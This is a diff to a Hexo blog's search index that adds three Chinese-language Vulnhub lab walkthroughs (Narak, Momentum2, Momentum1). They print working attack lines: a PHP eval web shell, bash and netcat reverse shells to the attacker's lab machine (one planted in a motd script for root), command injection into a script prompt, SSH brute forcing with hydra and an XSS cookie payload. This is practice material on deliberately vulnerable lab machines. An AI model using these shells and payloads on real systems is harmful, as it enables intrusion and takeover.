@@ -4,12 +4,31 @@
   
   
   <entry>
-    <title>image-test</title>
-    <link href="/2026/01/18/image-test/"/>
-    <url>/2026/01/18/image-test/</url>
+    <title>Hello World</title>
+    <link href="/2026/01/17/hello-world/"/>
+    <url>/2026/01/17/hello-world/</url>
     
-    <content type="html"><![CDATA[<h1>images-test</h1><p>test</p><p>“<img src="/2026/01/18/image-test/IMG_0812.png" alt="images">“</p><p>test</p><p>“<img src="/2026/01/18/image-test/IMG_2044.PNG" alt="images1">“</p>]]></content>
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
     
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Narak</title>
+    <link href="/2025/01/18/Narak/"/>
+    <url>/2025/01/18/Narak/</url>
+    
+    <content type="html"><![CDATA[<p><code>arp-scan -l</code>探测到<code>192.168.182.152</code>为靶机地址</p><p>分别使用<code>sudo nmap -sT --min-rate=10000 192.168.182.152</code>，<code>sudo nmap -sC -sV -O -Pn -n -p22,80 192.168.182.152</code>，<code>sudo nmap --script=vuln -Pn -n 192.168.182.152</code>三条命令进行端口扫描，漏洞脚本扫描和详细信息扫描</p><p><img src="/2025/01/18/Narak/image-20260118230332726.png"></p><p>使用<code>sudo nmap -sU --top-ports 20 192.168.182.152</code>对使用频率最高的20个端口进行UDP扫描，发现开放了<code>tftp</code>服务，先做好记录万一后面用得上。继续进行常规目录扫描<code>sudo dirb http://192.168.182.152</code></p><p><img src="/2025/01/18/Narak/image-20260118230724101.png"></p><p>结果有点少，但是<code>webdav</code>和<code>images</code>是比较感兴趣的，换<code>gobuster</code>继续进行扫描</p><p><img src="/2025/01/18/Narak/image-20260118230849488.png"></p><p>这次扫出了一个<code>tips.txt</code>文件，打开看看</p><p><img src="/2025/01/18/Narak/image-20260118230925495.png"></p><p>意思说是想要打开narak的大门提示藏在<code>creds.txt</code>文件中，刚刚添加了<code>.txt</code>文件后缀进行扫描却没有扫出这个<code>creds.txt</code>，那先看看其他目录扫描结果</p><p><img src="/2025/01/18/Narak/image-20260118231307313.png"></p><p>80端口，是一些关于印度教的内容，点击以下<code>Do not Click</code>会跳转到以下页面</p><p><img src="/2025/01/18/Narak/image-20260118231404142.png"></p><p>一篇漫画，再去看看<code>/images</code>目录</p><p><img src="/2025/01/18/Narak/image-20260118231447762.png"></p><p>都是一些关于印度教中的神的图片，去看看<code>/webdav</code>目录，发现需要进行登录，目前还没有找到相关登录凭证</p><p><img src="/2025/01/18/Narak/image-20260118231630157.png"></p><p>没头绪了，返回一开始的<code>tftp</code>，果然有戏，结合<code>creds.txt</code>提示直接get下来</p><p><img src="/2025/01/18/Narak/image-20260118231809680.png"></p><p>查看<code>creds.txt</code>里的内容，一眼base64加密，那么直接echo出来并解密就行</p><p><img src="/2025/01/18/Narak/image-20260118231908956.png"></p><p>得到一个凭据，尝试登录ssh失败，那应该是webdav的登录凭据了，尝试登录webdav成功</p><p><img src="/2025/01/18/Narak/image-20260118232027978.png"></p><p>再利用<code>devtest</code>检测一下它能干嘛</p><p><code>davtest -url http://192.168.182.152/webdav -auth yamdoot:Swarg</code></p><p><img src="/2025/01/18/Narak/image-20260118232206609.png"></p><p>可以看到能使用PUT请求进行文件上传操作，那么大致思路就是传个一句话木马上去进行getshell，利用<code>cadaver</code>工具进行上传，<code>cadaver http://192.168.182.152/webdav</code>，输入登录凭证后<code>put shell.php</code>即可</p><p><img src="/2025/01/18/Narak/image-20260118232528767.png"></p><p>然后kali那边进行监听即可收到shell</p><p><img src="/2025/01/18/Narak/image-20260118232600453.png"></p><p>后续就是进行提权，发现了一个名为<code>hell.sh</code>以及<code>motd</code>(Message of the day)文件，先看<code>hell.sh</code>文件内容，发现是<code>BrainFuck</code>加密</p><p><img src="/2025/01/18/Narak/image-20260118232858970.png"></p><p>拿去在线解密，得到一个像用户名又像密码的凭据：<code>chitragupt</code></p><p><img src="/2025/01/18/Narak/image-20260118232921359.png"></p><p>根据刚刚得到的三个用户名，对其进行组合成一个字典然后使用<code>hydra</code>（九头蛇）进行ssh账户爆破</p><p><img src="/2025/01/18/Narak/image-20260118233157462.png"></p><p>得到正确登录凭据：<code>inferno:chitragupt</code>，尝试登录成功</p><p><img src="/2025/01/18/Narak/image-20260118233310765.png"></p><p>先去&#x2F;etc&#x2F;update-motd.d目录，往<code>00-header</code>文件中写入提权逻辑<code>echo -e &quot;bash -c \&quot;bash -i &gt; &amp; /dev/tcp/192.168.182.155/4435 0&gt;&amp;1\&quot;&quot; &gt;&gt; 00-header</code></p><p><img src="/2025/01/18/Narak/image-20260118234121930.png"></p><p>kali进行监听即可收到shell</p><p><img src="/2025/01/18/Narak/image-20260118234145847.png"></p><h3>总结</h3><p>前期利用<code>nmap、dirb、gobuster</code>工具进行端口扫描和目扫描；在tftp服务中拿到<code>creds.txt</code>中的<code>webdav</code>登录凭证信息；利用<code>cadaver</code>工具进行PUT传木马上去获得立足点；<code>hell.sh</code>解密拿到ssh登录凭证；组合用户名和密码爆破ssh；写入00-header提权逻辑进行提权获取最终的Flag</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Vulnhub</category>
+      
+    </categories>
     
     
     <tags>
@@ -23,13 +42,50 @@
   
   
   <entry>
-    <title>Hello World</title>
-    <link href="/2026/01/17/hello-world/"/>
-    <url>/2026/01/17/hello-world/</url>
+    <title>Momentum2</title>
+    <link href="/2025/01/18/Momentum2/"/>
+    <url>/2025/01/18/Momentum2/</url>
     
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    <content type="html"><![CDATA[<p><code>arp-scan -l</code>发现靶机地址为<code>192.168.182.173</code></p><p><code>sudo nmap --script=vuln 192.168.182.173</code>进行漏洞脚本扫描</p><p><img src="/2025/01/18/Momentum2/image-20260118220244813.png"></p><p><code>sudo nmap -sT -A -O -p- --min-rate=10000 192.168.182.173</code>进行详细信息扫描，看到开放了80和22两个端口</p><p><img src="/2025/01/18/Momentum2/image-20260118220455537.png"></p><p><code>sudo gobuster dir -u http://192.168.182.173 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,zip</code>进行目录扫描，发现内容挺多的</p><p><img src="/2025/01/18/Momentum2/image-20260118220716660.png"></p><p>其中<code>/owls</code>目录存在文件上传点，尝试进行文件上传getshell，但是经过多次测试发现只允许上传txt文本文件</p><p><img src="/2025/01/18/Momentum2/image-20260118220901155.png"></p><p>而无法上传php等后缀文件</p><p><img src="/2025/01/18/Momentum2/image-20260118220945377.png"></p><p>但是刚刚目录扫描到了<code>ajax.php.bak</code>备份文件，尝试把它下载到本地进行分析</p><p><img src="/2025/01/18/Momentum2/image-20260118221056543.png"></p><p>查看<code>ajax.php.bak</code>文件，了解了文件上传的要求</p><p><img src="/2025/01/18/Momentum2/image-20260118221249444.png"></p><p>首先，这段代码要求数据包中要有<code>Cookie</code>并且值为<code>admin=&amp;G6u@B6uDXMq&amp;Ms</code>再补一位大写字母，其次要用POST方法传一个<code>secure</code>参数值为<code>val1d</code>，只有同时满足以上两个条件才允许上传<code>.php</code>文件，否则只能传<code>.txt</code>，上传后返回<code>1</code>表示成功</p><p><img src="/2025/01/18/Momentum2/image-20260118221658775.png"></p><p>把上面上传的数据包改成所要求的形式再写入一句话木马<code>&lt;?php @eval($_POST[cmd]);?&gt;</code>，然后再使用<code>蚁剑</code>连接即可</p><p><img src="/2025/01/18/Momentum2/image-20260118221926504.png"></p><p>连接成功，然后在<code>/home/athena/</code>目录下找到<code>user.txt</code></p><p><img src="/2025/01/18/Momentum2/image-20260118222015663.png"></p><p>在该目录下，还存在<code>password-reminder.txt</code>，里面存放有某个登录密码<code>myvulnerableapp[Asterisk]</code>，这个应该就是ssh的登录凭证了，拿去尝试进行登录</p><p><img src="/2025/01/18/Momentum2/image-20260118222308028.png"></p><p>登录成功（注：密码里的<code>Asterisk</code>其实是<code>*</code>符号的意思，所以在输入密码后需要在后面加一个<code>*</code>号），发现一个名为<code>cookie-gen.py</code>的脚本文件，查看一下文件内容</p><p><img src="/2025/01/18/Momentum2/image-20260118222615958.png"></p><p>意思就是，运行该脚本后它会让我们输入<code>seed</code>的值，这个值会echo到<code>log.txt</code>文件中且会执行bash，那么我们可以在输入seed值的时候直接利用nc进行反弹shell</p><p>靶机：<code>;nc -e /bin/bash 192.168.182.221 4433</code></p><p>kali：<code>nc -lvvp 4433</code></p><p><img src="/2025/01/18/Momentum2/image-20260118223026040.png"></p><h3>总结</h3><p>利用<code>nmap</code>、<code>arp-scan</code>做基础信息收集；<code>gobuster</code>进行目录扫描；根据泄露的<code>ajax.php.bak</code>备份文件内容构造文件上传数据包getshell；利用<code>蚁剑</code>连接一句话木马并得到ssh登录凭证；利用<code>cookie-gen.py</code>脚本文件进行反弹shell；获取最终Flag</p>]]></content>
     
     
+    <categories>
+      
+      <category>Vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Vulnhub</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Momentum1</title>
+    <link href="/2025/01/18/Momentum1/"/>
+    <url>/2025/01/18/Momentum1/</url>
+    
+    <content type="html"><![CDATA[<p>使用<code>nmap</code>和<code>arp-scan</code>进行基础的信息收集，根据<code>arp-scan</code>的主机存活探测知道<code>192.168.182.186</code>为靶机地址，<code>sudo nmap --script=vuln 192.168.182.186</code>进行漏洞脚本扫描</p><p><img src="/2025/01/18/Momentum1/image-20260118204719965.png"></p><p>可以看到开放了80和22两个端口，接下来使用<code>gobuster</code>进行目录扫描，<code>sudo gobuster dir -u http://192.168.182.186 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,zip</code>，通过<code>-x</code>参数添加更多文件后缀进行Fuzz</p><p><img src="/2025/01/18/Momentum1/image-20260118205054142.png"></p><p>可以看到扫出挺多东西，那么先访问80端口看看</p><p><img src="/2025/01/18/Momentum1/image-20260118205540630.png"></p><p>看到有四张图片，随便点一张看看</p><p><img src="/2025/01/18/Momentum1/image-20260118205632754.png"></p><p>发现关键字<code>id</code>，那么可以尝试SQL注入攻击或者命令执行等操作</p><p><img src="/2025/01/18/Momentum1/image-20260118205735102.png"></p><p>发现会直接打印输出，没什么用，那么试试XSS攻击。Payload：<code>opus-detail.php?id=&lt;script&gt;alert(alert(document.cookie))&lt;/script&gt;</code></p><p><img src="/2025/01/18/Momentum1/image-20260118210021640.png"></p><p>成功拿到Cookie值，然后在刚刚的目录扫描的&#x2F;img目录中发现一段js代码</p><p><img src="/2025/01/18/Momentum1/image-20260118210249758.png"></p><p>这里提示说需要去AES解密一串字符串，关键字<code>SecretPassphraseMomentum</code>，那应该就是上面所拿到的Cookie值了</p><p><img src="/2025/01/18/Momentum1/image-20260118210551039.png"></p><p>对Cookie值进行AES解密，得到凭据<code>auxerre-alienum##</code>，估计就是ssh的登录凭证了</p><p><img src="/2025/01/18/Momentum1/image-20260118210712681.png"></p><p>登录成功，试了几次才发现一整串才是密码，拿到<code>user.txt</code>flag，后面继续进行提权</p><p><img src="/2025/01/18/Momentum1/image-20260118210925884.png"></p><p>发现了<code>.rediscli_history</code>，说明有redis服务，进去看看也是拿到了<code>rootpass</code>，那么直接切换root账户就行</p><p><img src="/2025/01/18/Momentum1/image-20260118211118543.png"></p><h3>总结</h3><p>使用<code>nmap</code>和<code>arp-scan</code>进行基础信息收集；<code>gobuster</code>进行目录扫描；XSS弹Cookie；解密拿到ssh登录凭证；redis-cli拿到rootpass；切换至root账户获取最终Flag。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Vulnhub</tag>
+      
+    </tags>
     
   </entry>
   
